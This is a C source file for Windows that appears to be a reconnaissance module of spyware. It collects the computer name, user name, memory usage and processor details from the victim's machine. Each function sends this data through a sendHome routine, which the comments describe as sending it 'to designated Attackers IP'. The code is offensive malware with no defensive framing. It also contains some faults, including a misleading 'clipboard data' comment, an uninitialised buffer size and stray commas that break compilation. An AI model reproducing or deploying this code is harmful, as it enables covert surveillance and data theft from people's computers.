#include "config.h"

int getIntel()
{
	//Retrieve computer's name and user's name.
	if (getUserInfo())
	{
		_tprintf(_T("ERROR: getUserInfo function call failed."));
		return 1;
	}

	//Get the current memory usage of the computer.
	if (getMemoryUsage())
	{
		_tprintf(_T("ERROR:getMemoryUsage function call failed."));
		return 1;
	}

	//Get the computer's specs.
	if (getSystemInfo())
	{
		_tprintf(_T("ERROR: getSystemInfo function call failed."));
		return 1;
	}

	return 0;
}

int getUserInfo()
{
	TCHAR  buffer[256], temp[256], temp2[256];
	char   string[256];
	size_t sizeConverted;

	//Get size of temp buffer.
	DWORD bufferSize = _tcslen(temp);

	//Get computer name and assign it to buffer.
	if (!GetComputerName(temp, &bufferSize))
	{
		_tprintf(_T("ERROR: GetComputerName function call failed."));
		return 1;
	}
	_stprintf_s(buffer, 256, _T("Computer name:   %s\n"), temp);

	//Get user name and assign it to buffer.
	if (!GetUserName(temp, &bufferSize))
	{
		_tprintf(_T("ERROR: GetUserName function call failed."));
		return 1;
	}
	_stprintf_s(temp2, 256, _T("Username:        %s\n"), temp);

	//Concatenate both buffers to send to Attacker.
	if (FAILED(StringCchCat(buffer, 256, temp2)))
	{
		_tprintf(_T("ERROR: StringCchCat function call failed."));
		return 1;
	}

	//Convert TCHAR to char buffer.
	if (wcstombs_s(&sizeConverted, string, 256, buffer, 256))
	{
		_tprintf(_T("ERROR: wcstombs_s function call failed."));
		return 1;
	}

	//Sends clipboard data to sendHome function 
	//to be sent to designated Attackers IP. 
	if (sendHome(string, 0))
	{
		_tprintf(_T("ERROR: sendHome function call failed.", ));
		return 1;
	}

	return 0;
}

int getMemoryUsage()
{
	TCHAR buffer[256], temp[256];
	char string[256];
	size_t sizeConverted;
	MEMORYSTATUSEX memory;

	//Get size of memory status variable.
	memory.dwLength = sizeof(memory);

	//Get the status of the systems memory usage and information.
	if (!GlobalMemoryStatusEx(&memory))
	{
		_tprintf(_T("ERROR: sendHome function call failed."));
		return 1;
	}

	//Get memory information totals.
	double totalMem = (memory.ullTotalPhys / DIV);
	double totalPage = (memory.ullTotalPageFile / DIV);
	double totalVMem = (memory.ullTotalVirtual / DIV);

	//Get currently used memory information.
	double usedMem = (memory.ullTotalPhys / DIV) - (memory.ullAvailPhys / DIV);
	double usedPage = (memory.ullTotalPageFile / DIV) - (memory.ullAvailPageFile / DIV);
	double usedVMem = (memory.ullTotalVirtual / DIV) - (memory.ullAvailVirtual / DIV);

	//Concatenate all of the data into one buffer.
	_stprintf_s(buffer, 256, _T("Memory Usage:    %*ld%% GB\n"), 1, memory.dwMemoryLoad);
	_stprintf_s(temp, 256, _T("Physical Memory: %.2f/%.2f GB\n"), usedMem / 100, totalMem / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Paging File:     %.2f/%.2f GB\n"), usedPage / 100, totalPage / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Virtual Memory:  %.2f/%.2f GB\n"), usedVMem / 100, totalVMem / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Extended Memory: %*I64d GB \n"), 1, memory.ullAvailExtendedVirtual / DIV);
	StringCchCat(buffer, 256, temp);

	//Convert TCHAR to char buffer.
	if (wcstombs_s(&sizeConverted, string, 256, buffer, 256))
	{
		_tprintf(_T("ERROR: wcstombs_s function call failed."));
		return 1;
	}

	//Sends clipboard data to sendHome function 
	//to be sent to designated Attackers IP. 
	if (sendHome(string, 0))
	{
		_tprintf(_T("ERROR: sendHome function failed.", ));
		return 1;
	}

	return 0;
}

int getSystemInfo()
{
	TCHAR buffer[256], temp[256];
	char string[256];
	size_t sizeConverted;
	SYSTEM_INFO systemInfo;

	//Get the system's information.
	GetSystemInfo(&systemInfo);

	//Concatenate all of the data into one buffer.
	_stprintf_s(buffer, 256, _T("OEM ID:          %u\n"), systemInfo.dwOemId);
	_stprintf_s(temp, 256, _T("# of processors: %u\n"), systemInfo.dwNumberOfProcessors);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Page size:       %u\n"), systemInfo.dwPageSize);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Processor type:  %u\n"), systemInfo.dwProcessorType);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Min app address: %lx\n"), systemInfo.lpMinimumApplicationAddress);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Max app address: %lx\n"), systemInfo.lpMaximumApplicationAddress);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Active processor mask: %u\n"), systemInfo.dwActiveProcessorMask);
	StringCchCat(buffer, 256, temp);

	//Convert TCHAR to char buffer.
	if (wcstombs_s(&sizeConverted, string, 256, buffer, 256))
	{
		_tprintf(_T("ERROR: wcstombs_s function call failed."));
		return 1;
	}

	//Sends clipboard data to sendHome function 
	//to be sent to designated Attackers IP. 
	if (sendHome(string, 0))
	{
		_tprintf(_T("ERROR: sendHome function failed.", ));
		return 1;
	}

	return 0;
}